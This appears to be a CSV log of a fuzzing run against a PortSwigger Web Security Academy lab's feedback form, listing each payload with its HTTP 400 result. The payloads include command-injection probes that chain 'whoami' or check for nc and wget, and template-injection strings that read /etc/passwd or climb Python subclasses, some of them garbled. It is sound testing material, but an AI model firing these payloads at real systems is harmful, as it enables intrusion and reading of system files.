id_fuzz_1,415,which curl,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,416,which gcc,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,417,which nc,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,418,which netcat,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,419,which perl,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,420,which python,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,421,which wget,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,422,whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,423,| whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,424,; whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,425,' whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,426,' || whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,427,' & whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,428,' && whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,429,'; whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,430,""" whoami",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,431,""" || whoami",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,432,""" | whoami",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,433,""" & whoami",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,434,""" && whoami",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,435,"""; whoami",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,436,$(`whoami`),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,437,& whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,438,&& whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,439,"{{ get_user_file(""C:oot.ini"") }}",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,440,"{{ get_user_file(""/etc/hosts"") }}",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,441,"{{ get_user_file(""/etc/passwd"") }}",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,442,{{4+4}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,443,{{4+8}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,444,{{person.secret}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,445,{{person.name}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,446,{1} + {1},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,447,"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,448,{{[] .__ Class __.__ base __.__ subclasses __ ()}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
